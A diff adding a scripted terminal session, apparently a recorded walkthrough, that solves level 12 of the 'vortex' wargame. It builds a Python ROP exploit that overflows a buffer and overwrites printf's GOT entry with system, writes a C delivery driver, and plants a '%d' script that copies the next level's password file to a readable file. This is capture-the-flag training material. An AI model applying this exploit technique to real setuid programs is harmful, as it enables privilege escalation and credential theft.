@@ -1,0 +1,75 @@
+@sleep 3
+@wait 12 D=$(mktemp -d); cd $D; pwd
+@wait 8 pwd
+@wait 8 ls -l /vortex/vortex12 /etc/vortex_pass/vortex13
+@wait 8 file /vortex/vortex12
+@wait 8 md5sum /vortex/vortex12
+@wait 8 readelf -l /vortex/vortex12 | grep -E 'GNU_STACK|RELRO' -A1
+@wait 10 objdump -d /vortex/vortex12 -M intel | sed -n '/<main>:/,/^$/p'
+@wait 10 objdump -d /vortex/vortex12 -M intel | sed -n '/<safecode>:/,/^$/p'
+@wait 10 objdump -d /vortex/vortex12 -M intel | sed -n '/<unsafecode>:/,/^$/p'
+@wait 10 objdump -R /vortex/vortex12 | grep -E 'printf|fflush|sleep|strcpy'
+@wait 8 echo "--- the exploit: build12.py (typed in vim) ---"
+@wait 6 vi build12.py
+@literal i
+@line #!/usr/bin/env python3
+@line # build12 - the L12 exploit payload:
+@line #   printf@GOT <- system@libc  (one 4-byte GOT write)
+@line # The ROP (all fixed addresses, no stack addresses - env-independent):
+@line #   1032 'A' filler       (unsafecode's buf[1032])
+@line #   saved ebp             (readable scratch)
+@line #   popal; cld; ret       (loads the registers from the stack)
+@line #   6 filler dwords       (edi esi ebp esp(skip) ebx edx - all readable)
+@line #   ecx = system@libc     (the VALUE written)
+@line #   eax = printf@GOT      (the DESTINATION)
+@line #   mov [eax],ecx; ret    (the write-what-where, libc+0x3caee)
+@line #   park: safecode's loop (keeps main alive; the thread hits the patch)
+@line # libc base 0xf7d6d000 (leaked live by the parking-loop trick: park with
+@line # [ebp-0xc]=sleep@GOT and the loop prints its resolved value).
+@line import struct
+@line base = 0xf7d6d000
+@line system = base + 0x53ce0        # system@libc
+@line www = base + 0x3caee           # mov [eax],ecx; ret
+@line F = 0x804c030                  # readable+writable scratch (bss, stdout ptr)
+@line P  = b'A'*1032
+@line P += struct.pack('<I', F)      # saved ebp
+@line P += struct.pack('<I', 0x804931d)   # popal; cld; ret
+@line P += struct.pack('<I', F)*6         # edi esi ebp esp(skip) ebx edx
+@line P += struct.pack('<I', system)      # ecx = system@libc
+@line P += struct.pack('<I', 0x804c004)   # eax = printf@GOT
+@line P += struct.pack('<I', www)         # mov [eax],ecx; ret
+@line P += struct.pack('<I', 0x8049260)   # park in safecode's loop
+@line assert b'\x00' not in P
+@line open('sy.bin','wb').write(P)
+@line print("sy.bin", len(P))
+@literal \x1b
+@literal :wq\r
+@wait 6 python3 build12.py
+@wait 8 echo "--- the delivery driver drv12.c (heredoc) ---"
+@wait 2 cat > drv12.c << 'EOF'
+@line #include <stdio.h>
+@line #include <stdlib.h>
+@line #include <unistd.h>
+@line /* drv12 - run /vortex/vortex12 with a raw-byte argv[1] read from a file
+@line    (the payload contains binary bytes; a shell argument would mangle it) */
+@line int main(int argc, char **argv) {
+@line     static char buf[16384];
+@line     FILE *f = fopen(argv[1], "r");
+@line     if (!f) return 1;
+@line     size_t n = fread(buf, 1, sizeof buf - 1, f);
+@line     fclose(f);
+@line     buf[n] = 0;
+@line     char *av[] = { "/vortex/vortex12", buf, 0 };
+@line     execv("/vortex/vortex12", av);
+@line     return 1;
+@line }
+@line EOF
+@wait 10 gcc -m32 -o drv12 drv12.c
+@wait 8 echo '--- plant the "%d\n" executable (the command string) ---'
+@wait 2 printf '%s\n' '#!/bin/sh' 'cp /etc/vortex_pass/vortex13 ./leak13.txt' 'chmod 644 ./leak13.txt' > '%d'
+@wait 3 chmod +x '%d'
+@wait 3 ls -l '%d'
+@wait 6 echo '--- fire the level over -T (next step) ---'
+@wait 8 echo '--- verify: login as vortex13 (next session) ---'
+@wait 8 exit
+
